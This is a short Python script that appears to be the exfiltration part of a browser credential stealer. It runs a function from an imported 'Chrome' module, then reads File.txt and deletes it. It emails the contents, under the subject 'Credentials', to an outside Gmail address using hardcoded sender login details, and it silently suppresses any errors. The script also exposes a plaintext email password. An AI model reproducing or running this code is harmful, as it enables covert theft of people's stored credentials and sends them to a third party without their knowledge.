# -*- coding: utf-8 -*-
"""
Created on Wed Jun  9 17:02:50 2021

@author: Musya
"""

import Chrome as chrome
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

call = chrome.main()

mail_content = "Hello, We got something"

#The mail addresses and password
sender_address = "newhack1999@gmail.com"
sender_pass = "0757405701Jm"
receiver_address = 'josephmusya254@gmail.com'

try:    
    #Setup the MIME
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'Credentials'

    #The subject line
    #The body and the attachments for the mail
    message.attach(MIMEText(mail_content, 'plain'))
    attach_file_name = "File.txt"
    attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    
    #DELETE
    attach_file.close()
    os.remove("File.txt")

    encoders.encode_base64(payload) #encode the attachment

    #add payload header with filename
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)

    #Create SMTP session for sending the mail
    session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
    session.starttls() #enable security
    session.login(sender_address, sender_pass) #login with mail_id and password
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
except:
    pass